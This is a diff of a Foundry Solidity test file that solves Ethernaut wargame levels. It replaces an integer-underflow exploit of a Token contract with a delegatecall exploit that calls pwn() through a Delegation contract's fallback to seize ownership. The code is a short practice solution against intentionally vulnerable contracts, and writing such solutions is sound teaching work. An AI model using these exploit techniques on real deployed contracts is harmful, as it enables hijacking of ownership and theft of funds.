@@ -4,23 +4,17 @@ pragma solidity ^0.8.0;
 import "forge-std/Test.sol";
 import {Utils} from "test/utils/Utils.sol";
 
-import {DummyFactory} from "src/levels/DummyFactory.sol";
+import {Delegation} from "src/levels/Delegation.sol";
+import {DelegationFactory} from "src/levels/DelegationFactory.sol";
 import {Level} from "src/levels/base/Level.sol";
 import {Ethernaut} from "src/Ethernaut.sol";
 
-interface Token {
-    function transfer(address, uint256) external returns (bool);
-
-    function balanceOf(address) external view returns (uint);
-}
-
-contract TestTokenSolution is Test, Utils {
+contract TestDelegationSolution is Test, Utils {
     Ethernaut ethernaut;
-    Token instance;
+    Delegation instance;
 
     address payable owner;
     address payable player;
-    address player2;
 
     /*//////////////////////////////////////////////////////////////
                                  HELPERS
@@ -35,16 +29,14 @@ contract TestTokenSolution is Test, Utils {
         player = users[1];
         vm.label(player, "Player");
 
-        player2 = makeAddr("player2");
-
         vm.startPrank(owner);
         ethernaut = getEthernautWithStatsProxy(owner);
-        DummyFactory factory = DummyFactory(getOldFactory("TokenFactory"));
+        DelegationFactory factory = new DelegationFactory();
         ethernaut.registerLevel(Level(address(factory)));
         vm.stopPrank();
 
         vm.startPrank(player);
-        instance = Token(payable(createLevelInstance(ethernaut, Level(address(factory)), 0)));
+        instance = Delegation(createLevelInstance(ethernaut, Level(address(factory)), 0));
         vm.stopPrank();
     }
 
@@ -54,30 +46,26 @@ contract TestTokenSolution is Test, Utils {
 
     /// @notice Check the intial state of the level and enviroment.
     function testInit() public {
-        vm.startPrank(player);
+        vm.prank(player);
         assertFalse(submitLevelInstance(ethernaut, address(instance)));
     }
 
     /// @notice Test the solution for the level.
     function testSolve() public {
-        // goal:
-        // - hack the Token.sol contract
 
-        // solution:
-        // token contract is using a solidity version which is < 0.8.0 
-        // any solidity < 0.8.0 allows variables to over/underflow without reverting
-        // for solving this we can transfer 1 more token than we own so our balance can be underflow and return type(uint256).max
+        // goal: claim the ownership of the contract
+
+        // the ownership of Delegation contract can be claimed by triggering
+        // fallback function by sending 0 ethereum and a msg.data with the encoded function we want to call
 
         vm.startPrank(player);
-        // starting balance 20
-        console.log(instance.balanceOf(player));
+        // this will call pwn() function which(i think) intends to set the owner as the msg sender which should be the Delegation contract.
+        // but msg sender in delegate calls actually keeps the original msg.sender which is player address.
+        address(instance).call{value: 0}(abi.encodeWithSignature("pwn()"));
 
-        // send to player2(any other wallet) balance + 1 to create underflow and make uint256 max value of balance
-        instance.transfer(player2, 21);
-
-        // after overflow this will return type(unit256).max
-        console.log(instance.balanceOf(player));
-
-        assertGt(instance.balanceOf(player) , 20);
+        console.log(instance.owner());
+        
+        // i'm not lying 
+        assertEq(instance.owner(), player);
     }
 }
